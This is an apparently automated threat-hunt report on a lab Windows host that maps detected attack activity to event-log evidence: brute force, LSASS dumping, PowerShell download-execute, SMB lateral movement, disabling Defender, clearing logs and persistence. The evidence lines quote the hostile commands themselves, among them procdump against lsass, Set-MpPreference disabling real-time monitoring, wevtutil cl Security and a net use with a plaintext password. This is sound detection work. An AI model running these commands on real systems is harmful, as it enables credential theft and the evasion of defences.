report.executive_summary: Autonomous threat hunt completed. Multiple ATT&CK techniques confirmed.

findings.title: Brute Force Attack Against Administrator Account
findings.description: Detected sustained brute force attack targeting the Administrator account from 192.168.1.105 over SMB (LogonType 3). 15 failed authentication attempts occurred within 5 minutes (02:30:03 to 02:34:27) with varying source ports, indicating systematic credential guessing via network-based SMB protocol. All attempts were from the same source IP but different ports, consistent with credential stuffing attack pattern.

findings.title: Credential Dumping from LSASS Process
findings.description: Detected multiple indicators of credential dumping attacks targeting LSASS process. PowerShell reconnaissance of LSASS process (02:46:20), followed by direct process access from PowerShell (Sysmon Event 10 at 02:49:11 with GrantedAccess 0x1010), and execution of procdump.exe to dump LSASS memory (02:49:27). This represents a complete credential dumping attack chain targeting cached authentication material.
evidence: EventID=4688 | 02:46:20 | powershell.exe -c Get-Process | Where-Object {$_.Name -eq 'lsass'}
EventID=10 | 02:49:11 | Sysmon Process Access | PowerShell targeting lsass.exe | GrantedAccess=0x1010
EventID=4688 | 02:49:27 | procdump.exe -ma lsass.exe lsass.dmp | ParentProcess=cmd.exe

findings.title: PowerShell-Based Command Execution and Reconnaissance
findings.description: Extensive use of PowerShell for malicious command execution and system reconnaissance. Attack chain includes: execution policy bypass commands, system enumeration (hostname, ipconfig, net user), process investigation, and remote code execution attempts. Multiple instances of -Exec Bypass, -NoP (NoProfile), -NonI (NonInteractive), and -W Hidden (Hidden Window) flags indicating obfuscation and evasion techniques. Evidence includes atomic red team module imports and download-execute pattern attempts.
evidence: EventID=4688 | 02:42:02 | powershell.exe -exec bypass -c Import-Module C:\AtomicRedTeam\invoke-atomicredteam
EventID=4688 | 02:42:42 | pwsh.exe -c [System.Reflection.Assembly]::LoadWithPartialName
EventID=4688 | 02:43:19 | powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadStr
EventID=1 | 02:45:26 | ipconfig /all executed via PowerShell parent
EventID=1 | 02:46:13 | net user executed via PowerShell parent
EventID=1 | 02:42:44 | hostname executed via PowerShell parent

findings.title: Lateral Movement via SMB Network Shares
Lateral Movement via SMB Network Shares - Detailed
findings.description: Detected SMB-based lateral movement attacks targeting remote hosts 192.168.1.110 and 192.168.1.115 on port 445. Direct evidence includes: (1) net use command at 03:01:45 attempting to connect to \\192.168.1.110\C$ with embedded Administrator credentials (Lab123!), (2) Sysmon network connection events showing SMB connections to 192.168.1.115 and 192.168.1.110 on port 445. This indicates active lateral movement exploitation using stolen or guessed credentials.
evidence: EventID=4688 | 03:01:45 | net use \\192.168.1.110\C$ /user:Administrator Lab123!
EventID=3 | 03:01:37 | Sysmon Network Connection | net.exe to 192.168.1.115:445 TCP
EventID=3 | 03:03:47 | Sysmon Network Connection | net.exe to 192.168.1.110:445 TCP

findings.title: Defense Evasion and Security Tool Disabling
findings.description: Multiple coordinated attacks on Windows security infrastructure. Evidence includes: (1) PowerShell-based disabling of Windows Defender real-time monitoring and behavior monitoring (02:55:58 and 02:44:54), (2) Registry modification to disable Windows Defender AntiSpyware via registry policy (02:56:28), (3) Registry modification adding persistence mechanism in Run key (03:06:20), and (4) Security event log clearing via wevtutil cl Security (03:15:53). This represents comprehensive defense evasion to hide malicious activity and disable protections.
evidence: EventID=4688 | 02:44:54 | powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
EventID=4688 | 02:55:58 | powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true
EventID=13 | 02:56:28 | Registry | powershell.exe modified HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware
EventID=13 | 03:06:20 | Registry | reg.exe modified HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
EventID=4688 | 03:15:53 | wevtutil cl Security - clearing event logs

findings.title: Persistence via Scheduled Task Creation
findings.description: Attacker created a malicious scheduled task disguised as legitimate Windows Update activity. Task named 'Microsoft\\Windows\\WindowsUpdate\\UpdateCheck' was created by Administrator at 02:53:15 with PowerShell payload containing IEX (Invoke-Expression) command for remote code download and execution. This provides persistence mechanism for maintaining access and re-executing malicious code.
